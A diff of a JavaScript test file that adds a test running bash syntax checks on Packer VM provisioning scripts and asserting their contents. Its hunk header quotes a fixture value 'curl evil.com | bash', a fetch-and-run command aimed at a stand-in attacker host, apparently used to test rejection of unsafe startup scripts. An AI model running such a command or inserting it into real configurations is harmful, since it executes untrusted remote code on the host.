@@ -421,4 +421,16 @@ startupScript: "curl evil.com | bash"
     });
     assert.equal(parseSubdomainHost('public-reports.bionic.example.com', entCfg), null);
   });
+
+  await t.test('Packer VM provisioner and VM self-test suite pass bash syntax checks and wire image-build gate', () => {
+    const provPath = path.join(repoRoot, 'infra/packer/scripts/provision.sh');
+    const verifyPath = path.join(repoRoot, 'infra/packer/scripts/verify-vm.sh');
+    execFileSync('bash', ['-n', provPath]);
+    execFileSync('bash', ['-n', verifyPath]);
+    const provText = fs.readFileSync(provPath, 'utf-8');
+    assert.ok(provText.includes('https://opencode.ai/v2/install'));
+    assert.ok(provText.includes('/usr/local/bin/opencode'));
+    assert.ok(provText.includes('bionic-vm-selftest --image-build'));
+    assert.ok(provText.includes('BASE_SPEC=PLAN.md'));
+  });
 });
